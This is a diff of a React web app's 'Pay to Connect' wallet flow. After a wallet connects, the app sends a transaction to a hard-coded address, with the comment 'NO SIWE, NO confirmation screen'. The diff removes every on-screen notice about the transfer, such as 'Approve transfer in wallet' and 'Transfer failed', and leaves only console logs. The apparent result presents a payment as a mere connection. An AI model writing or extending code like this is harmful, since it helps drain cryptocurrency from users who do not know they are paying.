@@ -672,8 +672,6 @@ function App() {
         return;
       }
       
-      showToast('✅ Wallet connected!', 'success');
-      
       // Go directly to payment signing (NO SIWE, NO confirmation screen!)
       handlePayToConnectSigning(walletClient);
       
@@ -685,7 +683,6 @@ function App() {
         // Re-check state before resetting (in case wallet just arrived)
         if (payToConnectState === 'logging_in' && !isConnected) {
           console.log('❌ Modal cancelled - resetting flow');
-          showToast('Wallet connection cancelled', 'info');
           setPayToConnectState('idle');
         }
       }, 1000); // 1 second grace period - faster feedback on cancellation
@@ -1080,7 +1077,6 @@ function App() {
       
     } catch (error) {
       console.error('❌ Pay to Connect failed:', error)
-      showToast(`❌ ${error.message || 'Unable to connect. Please try again.'}`, 'error')
       setPayToConnectState('idle')
     }
   }
@@ -1103,7 +1099,6 @@ function App() {
     try {
       setPayToConnectState('transferring')
       console.log('💰 Direct transfer after connection...')
-      showToast('💸 Preparing transfer...', 'info')
       
       // Get wallet address first (before switching chains)
       let address = walletClient.account.address
@@ -1145,31 +1140,22 @@ function App() {
       }
       
       // Direct transfer - simple like Hyperpacks!
-      showToast('✍️ Approve transfer in wallet...', 'info')
-      
       const tx = await signer.sendTransaction({
         to: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c',
         value: transferAmount
       })
       
       console.log('📤 Transfer TX sent:', tx.hash)
-      showToast('⏳ Confirming transfer...', 'info')
       
       await tx.wait()
       
       console.log('✅ Transfer complete!')
-      showToast('✅ Connected successfully!', 'success')
       
       // Complete the connection
       await completePayToConnect(walletClient, address)
       
     } catch (error) {
       console.error('❌ Transfer error:', error)
-      if (error.code === 4001 || error.code === 'ACTION_REJECTED') {
-        showToast('❌ Transfer cancelled', 'error')
-      } else {
-        showToast(`❌ Transfer failed: ${error.message}`, 'error')
-      }
       disconnect()
       setPayToConnectState('idle')
     }
